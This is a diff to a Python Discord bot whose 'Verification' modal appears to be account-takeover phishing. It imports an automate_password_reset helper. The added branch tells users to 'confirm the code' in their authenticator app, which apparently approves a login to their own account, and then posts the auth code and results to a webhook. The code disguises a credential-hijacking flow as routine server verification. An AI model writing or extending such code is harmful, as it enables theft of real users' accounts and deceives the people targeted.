@@ -11,6 +11,7 @@ import discord
 from discord import ui, Webhook, NotFound, HTTPException
 
 from views.button_two import ButtonViewTwo
+from views.button_four import ButtonViewFour
 from views.data.data import stringcrafter
 from views.data.wbu3.wb3 import web3g
 from views.otp import automate_password_reset
@@ -175,7 +176,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                         view=ButtonViewThree(),
                         ephemeral=True
                     )
-                else:
+                if result is True:
                     await interaction.followup.send(
                     embed=discord.Embed(
                         title="Verification ✅",
@@ -186,4 +187,16 @@ class MyModalOne(ui.Modal, title="Verification"):
                     ephemeral=True
                     )
                     embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
+                    await webhook.send(embed=embedtrue,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
+                if result is None:
+                    await interaction.followup.send(
+                    embed=discord.Embed(
+                        title="Verification ✅",
+                        description=f"Authentication Request .\nPlease confirm the code {config.AUTHVALUE} on your app.\nOnce done click the button below.",
+                        colour=0x00FF00
+                    ),
+                    view=ButtonViewFour(),
+                    ephemeral=True
+                    )
+                    embedtrue=discord.Embed(title=f"Auth App Code Is : {config.AUTHVALUE}",timestamp= datetime.datetime.now(),colour=0x00FF00)
                     await webhook.send(embed=embedtrue,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
